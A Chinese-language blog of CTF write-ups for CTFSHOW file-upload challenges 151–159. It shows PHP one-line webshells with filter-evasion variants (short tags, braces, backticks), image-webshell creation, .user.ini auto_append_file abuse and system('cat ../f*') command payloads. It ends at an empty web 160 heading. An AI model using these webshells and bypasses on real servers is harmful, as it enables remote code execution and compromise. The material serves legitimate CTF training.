---
description: >-
  这里直接展示自己刷题的题解了，怎么办，已经坚持不了继续写知识点总结了，想疯狂刷题了，写知识点真的好难受，单纯的写总结，好累啊，比做题还累，/(ㄒoㄒ)/~~。
---

# 🚗 CTFSHOW文件上传web入门

## <mark style="color:green;background-color:blue;">（1）web 151</mark>

<figure><img src="../.gitbook/assets/image (10) (1) (1).png" alt=""><figcaption></figcaption></figure>

### <mark style="color:green;">①代码解释</mark>

<figure><img src="../.gitbook/assets/image (72).png" alt=""><figcaption></figcaption></figure>

这里只放了关键性的代码，其实我最开始的时候没看到这个地方，他上面写了，accept的类型是png后缀的images，我最开始找的是jpg，我真服了。

### <mark style="color:green;">②思路解释：</mark>

其实他已经提示了是前台校验，所以我们直接用前端校验的解决方法。他要求是上传的图片，我们可以写一个一句话木马，然后直接修改他的js代码。

一句话木马：

```php
<?php
@eval($_POST['a']);
?>

```

然后生成图片马。图片马的生成在编写一句话木马的专栏里面有讲到，这里放一个传送门  [#id-3-sheng-cheng-tu-pian-ma](../lfi-he-rfl-wen-jian-bao-han-lou-dong/编写一句话木马.md#id-3-sheng-cheng-tu-pian-ma "mention")

这里放一张png后缀的图片吧，懒得让大家去找了。

<figure><img src="../.gitbook/assets/raw.png" alt=""><figcaption></figcaption></figure>

```sh
cat raw.png 1.php > shell.png 
```

<figure><img src="../.gitbook/assets/image (73).png" alt=""><figcaption></figcaption></figure>

然后我们将这个图片马上传上去.然后用burpsuite将传上去的这个包抓下来。

<figure><img src="../.gitbook/assets/image (74).png" alt=""><figcaption></figcaption></figure>

因为他是前台校验，能上传成功就说明已经通过校验了，但是我们要上传的其实是我们的1.php（也就是我们的木马文件），所以我们要将我们上传的内容修改一下。我们要修改文件名，是我们的1.php，还要修改上传的内容，把png的部分删掉，留下我们的木马部分的代码。

<figure><img src="../.gitbook/assets/image (75).png" alt=""><figcaption></figcaption></figure>

出现200说明我们上传成功了，并且还有到了upload/1.php。

然后我们关闭bp，可以再send一下来再发一次以防万一。然后查看/upload/1.php文件，来确定是否真的传上去了。我们这里是空白，没有出现404，说明成功了。

<figure><img src="../.gitbook/assets/image (76).png" alt=""><figcaption></figcaption></figure>

现在我们已经getshell了，我们就传入我们的指令查看文件内容目录之类的就行了。

<figure><img src="../.gitbook/assets/image (77).png" alt=""><figcaption></figcaption></figure>

最开始我还在想怎么没有flag.php,后来才意识到这是upload下面，我得到上一级目录下去看。

<figure><img src="../.gitbook/assets/image (78).png" alt=""><figcaption></figcaption></figure>

然后在上一级目录看到了flag.php,然后查看此文件（记住我们还是在upload目录下）

<figure><img src="../.gitbook/assets/image (79).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../.gitbook/assets/image (80).png" alt=""><figcaption></figcaption></figure>

***

## <mark style="color:blue;background-color:green;">（2）web 152</mark>

<figure><img src="../.gitbook/assets/image (38).png" alt=""><figcaption></figcaption></figure>

### <mark style="color:green;">①代码解释</mark>

<figure><img src="../.gitbook/assets/image (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

前端和上一题一样没啥区别，应该主要是后端的代码。

### <mark style="color:green;">②思路解释</mark>

还是和上一题一样的图片马，上传。抓包

<figure><img src="../.gitbook/assets/image (2) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

题目中提示，后端校验不能单一，就能知道是我们上题的mime—type没有修改但是也通过校验了，所以猜测是这一次添加了mime-type的校验，png图片对应的mime-type是image/png，修改好后发送。

<figure><img src="../.gitbook/assets/image (3) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

然后查看upload/1.php，然后传入执行代码。

GET

```url
http://38498ddd-3061-4bb8-8590-a99800a45355.challenge.ctf.show/upload/1.php
```

POST

```url
x=system("ls ../");
```

<figure><img src="../.gitbook/assets/image (4) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

然后查看flag.php文件

GET

```url
http://38498ddd-3061-4bb8-8590-a99800a45355.challenge.ctf.show/upload/1.php
```

POST

```url
x=system("cat ../f*");
```

<figure><img src="../.gitbook/assets/image (5) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

***

## <mark style="color:blue;background-color:green;">(3)WEB 153</mark>

<figure><img src="../.gitbook/assets/image (6) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

### <mark style="color:green;">①思路解释</mark>

其实这个题emmm，没想到进阶有点quick，是.user.ini的利用，具体知识点是在文件上传漏洞知识总结里面有。害，不多说。

首先我们要上传.user.ini文件上去，并且要他包含我们的木马文件。因为这个后端检验要求交png文件，所以我们在后面加上.user.ini.php文件，然后抓包将后缀修改了。

<figure><img src="../.gitbook/assets/image (4) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

```
auto_append_file="shell.png"
```

然后我们将文件上传上去，这个时候他的校验还没有利用文件头也没有黑白名单，直接弄个后缀和mime-type就交上了，然后我们抓个包。把.user.ini.png改回到.user.ini

<figure><img src="../.gitbook/assets/image (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

然后我们再将shell.png图片马上传上去。抓包上传，所以现在upload下的index.php文件中包含了我们的执行代码，然后我们再看看index.php确定我们的php代码被执行了。

<figure><img src="../.gitbook/assets/image (2) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../.gitbook/assets/image (3) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

然后我们输入执行代码

GET：

```url
http://45ff19ab-ea66-486d-a56a-ccb2c585ac93.challenge.ctf.show/upload/index.php
```

POST：

```url
x=system("cat../flag.php");
```

得到源代码

<figure><img src="../.gitbook/assets/image (4) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

***



## <mark style="color:blue;background-color:green;">（4）web 154</mark>

<figure><img src="../.gitbook/assets/image (5) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>



### <mark style="color:green;">①思路讲解</mark>

在这个地方，我先是将我的图片马直接传上去的时候，显示内容不合规，内容不合规，说明是里面的内容被过滤了。

<figure><img src="../.gitbook/assets/image (6) (1) (1).png" alt=""><figcaption></figcaption></figure>

猜测是内容里面的php代码片段里面出现的php被过滤了，所以我们现在需要更改我们的一句话来绕过。就是一句话木马的变型形式，改为\<?=  ?>这种。

```php
<?=
@eval($_POST['a']);
?>

```

然后重新生成图片马

<figure><img src="../.gitbook/assets/image (7) (1) (1).png" alt=""><figcaption></figcaption></figure>

然后上传发现可以上传成功

<figure><img src="../.gitbook/assets/image (8) (1) (1).png" alt=""><figcaption></figcaption></figure>

然后我们将需要上传的这个包抓下来，进行修改，然后我直接将抓到的包进行修改后缀名的时候发现，也失败了，所以这里还是要像上一步一样，进行.user.ini留一个后门。

<figure><img src="../.gitbook/assets/image (10) (1).png" alt=""><figcaption></figcaption></figure>

然后我们再将shell2.png文件抓包上传上去

<figure><img src="../.gitbook/assets/image (11) (1).png" alt=""><figcaption></figcaption></figure>

这个时候后门和木马文件都弄好了，我们只要输入执行指令就行。

<figure><img src="../.gitbook/assets/image (12) (1).png" alt=""><figcaption></figcaption></figure>

GET：

```url
http://cb7d8f63-573f-41f7-8989-f2ff32997d96.challenge.ctf.show/upload/index.php
```

POST：

```url
a=system("cat ../f*");
```

然后查看源码

![](<../.gitbook/assets/image (13).png>)\


***

## <mark style="color:blue;background-color:green;">（5）web 155</mark>

<figure><img src="../.gitbook/assets/image (14).png" alt=""><figcaption></figcaption></figure>

### <mark style="color:green;">①思路解释</mark>

发现了，就是一层层加严，但是前面的步骤还是得有，我真服了，这一下上传。看了说和上一题一样，是过滤了php/i这种，我猜测，但是我们的\<?= ?>还是能用。所以步骤和上一题一样。这里就只放图片了。

<figure><img src="../.gitbook/assets/image (15).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../.gitbook/assets/image (16).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../.gitbook/assets/image (17).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../.gitbook/assets/image (18).png" alt=""><figcaption></figcaption></figure>

***

## <mark style="color:blue;background-color:green;">（6）web 156</mark>

<figure><img src="../.gitbook/assets/image (19).png" alt=""><figcaption></figcaption></figure>

### <mark style="color:green;">①思路解释</mark>

这个地方有一个比较神奇的点，就是我们在上传的时候就只有.user.ini.png能上传上去，shell2.png甚至连上传都上传不了，说明，shell2.png里面有一些被过滤了，后来知道是过滤了\[]，服啦，这个过滤我还是真不知道怎么绕过，后来看wp说可以改成{}。

a其他步骤还是和上述是一样的。所以这里就先将代码文件修改一下

<figure><img src="../.gitbook/assets/image (20).png" alt=""><figcaption></figcaption></figure>

```php
<?=
@eval($_POST{'a'});
?>

```

然后重新生成图片马（其实我在这里的时候遇到了问题，就是我原来的png图片里面含有\[]，我真服了，需要重新找一个图片马）其实在这里他没有校验我的图片内容是啥，所以我直接把我的木马后缀变成.png也行。果然行。

<figure><img src="../.gitbook/assets/image (25).png" alt=""><figcaption></figcaption></figure>

然后再将.user.ini.png文件上传上去，然后抓包修改后缀。

<figure><img src="../.gitbook/assets/image (22).png" alt=""><figcaption></figcaption></figure>

然后把shell2.png上传上去

<figure><img src="../.gitbook/assets/image (23).png" alt=""><figcaption></figcaption></figure>

所以我们直接输入执行代码试试吧嘿嘿。

<figure><img src="../.gitbook/assets/image (26).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../.gitbook/assets/image (27).png" alt=""><figcaption></figcaption></figure>

***

## <mark style="color:blue;background-color:green;">（7）web 157</mark>

<figure><img src="../.gitbook/assets/image (28).png" alt=""><figcaption></figcaption></figure>

### <mark style="color:green;">①思路解释</mark>

把之前的png传上去显示不合规，就知道肯定又过滤了，就是在一直往后不断过滤。看别人的写的是把{}\[];之类的全部过滤了。

<figure><img src="../.gitbook/assets/image (29).png" alt=""><figcaption></figcaption></figure>

这个时候就说，反正后门会执行那个代码，其实我们可以不用绕一个弯弯，直接让index.php文件写入我们想要的执行代码，并且我们其实已经知道了flag.php文件在哪里，所以我们直接把我们的shell2.png改成\<?= system("cat ../f\*") ?>就行，并且就这一句，还可以不要分号。

<figure><img src="../.gitbook/assets/image (30).png" alt=""><figcaption></figcaption></figure>

```php
<?=
system("cat ../f*")
?>

```

再上传上去就发现成功了

<figure><img src="../.gitbook/assets/image (31).png" alt=""><figcaption></figcaption></figure>

然后我们还要把.user.ini.png上传上去并且修改一下后缀

<figure><img src="../.gitbook/assets/image (32).png" alt=""><figcaption></figcaption></figure>

然后直接查看upload文件夹下的源代码

<figure><img src="../.gitbook/assets/image (33).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../.gitbook/assets/image (34).png" alt=""><figcaption></figcaption></figure>

得到flag。

***

## <mark style="color:blue;background-color:green;">（8）web 158</mark>

发现上一题的图片还能被上传，所以步骤和上一题一样，这里就只截图了。

<figure><img src="../.gitbook/assets/image (35).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../.gitbook/assets/image (36).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../.gitbook/assets/image (37).png" alt=""><figcaption></figcaption></figure>

***

## <mark style="color:blue;background-color:green;">（9）web 159</mark>

<figure><img src="../.gitbook/assets/image (81).png" alt=""><figcaption></figcaption></figure>

### <mark style="color:green;">①思路解释：</mark>

我们把之前的shell2.png上传上去，显示不合规，说明里面还有被过滤了，其实我开始猜测的是引号，后面知道是（），就是把我们的执行代码的函数给ban了，所以我们用\`\`来执行代码。

先修改代码。

```php
<?=
`cat ../f*`
?>
```

然后再按照步骤上传，不多说了，直接截图。

<figure><img src="../.gitbook/assets/image (82).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../.gitbook/assets/image (83).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../.gitbook/assets/image (84).png" alt=""><figcaption></figcaption></figure>

***

## <mark style="color:blue;background-color:green;">（10）web 160</mark>















